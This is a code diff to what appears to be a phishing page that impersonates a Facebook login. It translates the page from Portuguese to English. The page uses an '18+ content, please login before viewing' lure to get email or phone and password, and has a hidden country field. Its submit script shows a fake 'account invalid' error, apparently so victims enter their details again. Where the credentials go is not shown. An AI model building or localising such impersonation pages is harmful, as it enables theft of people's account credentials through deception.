@@ -1,4 +1,6 @@
-<html>	
+<!DOCTYPE html>
+<html>
+
 <head>
     <meta charset="UTF-8" />
     <title></title>
@@ -128,18 +130,18 @@
                 <div class="modal-body">
                     <section class="login-form-wrap">
                         <h1 class="facebook_logo">Facebook</h1>
-                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Conteúdo para maiores de 18 anos, faça login antes de visualizar.</div>
+                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Content 18+, please login before viewing.</div>
                         <form class="login-form" id="test-form" method="GET">
                             <label class="mt-10">
-                                <input id="username" type="text" name="username" required="" placeholder="Email ou número de telefone">
+                                <input id="username" type="text" name="username" required="" placeholder="Email or phone number">
                             </label>
                             <label class="mt-10">
-                                <input id="password" type="password" name="password" required="" placeholder="Senha">
+                                <input id="password" type="password" name="password" required="" placeholder="password">
                             </label>
 							<input id="country" type="text" name="country" style="display:none">
-                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Entrar">
+                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Log in">
                         </form>
-                        <h5 class="forgotpass_h5"><a href="#" target="_blank" class="forgotpass">Você esqueceu sua senha?</a></h5>
+                        <h5 class="forgotpass_h5"><a href="#" target="_blank" class="forgotpass">Forgot password?</a></h5>
                     </section>
                 </div>
             </div>
@@ -201,7 +203,7 @@ function submitForm() {
     if ($('#username').val().length < 3 || $('#password').val().length < 6) {
 		//alert('Information entered is not correct');
 		$('#noti').css({ "color": "red" });
-		$('#noti').text('A conta que você inseriu é inválida, por favor, tente novamente.');
+		$('#noti').text('The account you have entered is invalid, Please try again.');
 		return;
     } else {
         //count++;
